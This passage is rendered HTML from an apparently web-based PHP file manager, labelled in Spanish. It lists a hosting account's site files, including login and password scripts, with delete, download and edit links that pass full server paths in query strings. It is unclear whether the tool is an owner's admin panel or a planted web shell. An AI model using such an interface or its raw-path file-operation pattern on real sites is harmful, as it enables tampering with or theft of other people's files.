                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">favoritos-borrar2.php</a></td>
                    <td>Archivo</td>
                    <td>218 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">favoritos.php</a></td>
                    <td>Archivo</td>
                    <td>4.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">favoritos.post.add.php</a></td>
                    <td>Archivo</td>
                    <td>810 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">header.php</a></td>
                    <td>Archivo</td>
                    <td>34.82 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">home.php</a></td>
                    <td>Archivo</td>
                    <td>1.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>15.42 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">login.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">mapa-del-sitio.php</a></td>
                    <td>Archivo</td>
                    <td>2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">miavatar_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>812 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">misimagenes.php</a></td>
                    <td>Archivo</td>
                    <td>3.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">misimagenes_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>987 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">mod-history.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">monitor.php</a></td>
                    <td>Archivo</td>
                    <td>6.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">next.php</a></td>
                    <td>Archivo</td>
                    <td>430 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">notificaciones-ajax.php</a></td>
                    <td>Archivo</td>
                    <td>5.63 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">password-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.48 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-cambiar.php::password-cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">password-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password-form.php::password-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">password.php</a></td>
                    <td>Archivo</td>
                    <td>2.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/password.php::password.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">perfil.php</a></td>
                    <td>Archivo</td>
                    <td>43.44 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/perfil.php::perfil.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::perfil.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">playlist.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/playlist.php::playlist.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::playlist.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">post.borrar.php</a></td>
                    <td>Archivo</td>
                    <td>630 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.borrar.php::post.borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">post.php</a></td>
                    <td>Archivo</td>
                    <td>69 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/post.php::post.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::post.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">posts.php</a></td>
                    <td>Archivo</td>
                    <td>2.84 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/posts.php::posts.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::posts.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">ppdias.php</a></td>
                    <td>Archivo</td>
                    <td>1.07 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/ppdias.php::ppdias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::ppdias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">prev.php</a></td>
                    <td>Archivo</td>
                    <td>439 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/prev.php::prev.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::prev.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">preview.php</a></td>
                    <td>Archivo</td>
                    <td>3.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/preview.php::preview.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::preview.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">privacidad-de-datos.php</a></td>
                    <td>Archivo</td>
                    <td>7.99 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/privacidad-de-datos.php::privacidad-de-datos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::privacidad-de-datos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">protocolo.php</a></td>
                    <td>Archivo</td>
                    <td>11.3 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/protocolo.php::protocolo.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::protocolo.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">recaptcha.php</a></td>
                    <td>Archivo</td>
                    <td>1.05 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recaptcha.php::recaptcha.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recaptcha.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">recomendar-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.1 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/recomendar-form.php::recomendar-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::recomendar.php">recomendar.php</a></td>
                    <td>Archivo</td>
                    <td>1.14 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
